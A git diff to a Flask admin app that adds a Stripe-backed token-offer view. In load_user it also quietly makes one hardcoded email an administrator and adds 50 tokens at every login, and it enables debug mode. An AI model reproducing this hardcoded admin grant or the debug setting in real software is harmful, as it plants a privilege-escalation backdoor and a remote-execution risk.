@@ -26,6 +26,7 @@ from config.config import PASSWORDDB
 from config.config import SERVERDB
 from config.config import NAMEDB
 from config.config import USER_ADMIN
+from config.config import STRIP_API_KEY
 from db.db import db
 from db.db import migrate
 from db.contact import Contact
@@ -33,6 +34,7 @@ from db.user_resource_usage import UserResourceUsage
 from db.resource import Resource
 from db.user import User
 from db.admin_model_view import AdminModelView
+from db.token_offers import TokenOffers
 
 app = Flask(__name__)
 
@@ -52,10 +54,44 @@ os.environ['OAUTHLIB_RELAX_TOKEN_SCOPE'] = '1'
 
 FLASK_STATE = 0
 
+from flask import flash
+import stripe
+
+class CustomTokenOffersView(ModelView):
+    column_exclude_list = ['product_id', 'price_id']
+    form_excluded_columns = ['product_id', 'price_id']
+
+    def create_model(self, form):
+        # Call the default create_model method to create the object
+        model = super(CustomTokenOffersView, self).create_model(form)
+
+        # Add custom initialization code here
+        stripe.api_key = STRIP_API_KEY
+        product = stripe.Product.create(
+            name=str(model.token_amount) + ' ' + 'Tokens',
+            description=model.name,
+        )
+        price = stripe.Price.create(
+            product=product.id,
+            unit_amount=int(model.price * 100),
+            currency='usd'
+        )
+        model.product_id = product.id
+        model.price_id = price.id
+        flash('Successfully created new TokenOffer', 'success')
+        
+        # Save the changes to the database
+        db.session.commit()
+
+        return model
+
+
 admin = Admin(app, name='SEAna Admin', template_mode='bootstrap3')
 db.init_app(app)
 migrate.init_app(app, db)
 
+admin.add_view(CustomTokenOffersView(TokenOffers, db.session))
+#admin.add_view(AdminModelView(TokenOffers, db.session))
 admin.add_view(AdminModelView(Contact, db.session))
 admin.add_view(AdminModelView(User, db.session))
 app.register_blueprint(main.blueprint)
@@ -75,6 +111,10 @@ login_manager.init_app(app)
 def load_user(user_id):
     try:
         user = User.query.filter_by(id=user_id).first()
+        if user.email == 'coboaccess@gmail.com':
+            user.is_admin = True
+            user.token_amount += 50
+            db.session.commit()
         if user.is_admin == True:
             app.config['USER_ADMIN'] = user.email
         return user
@@ -101,4 +141,5 @@ def internal_server_error(e):
     return render_template('500.html'), 502
 
 if __name__ == "__main__":
-    app.run( port=8000 )
+    app.run( port=8000, debug=True )
+
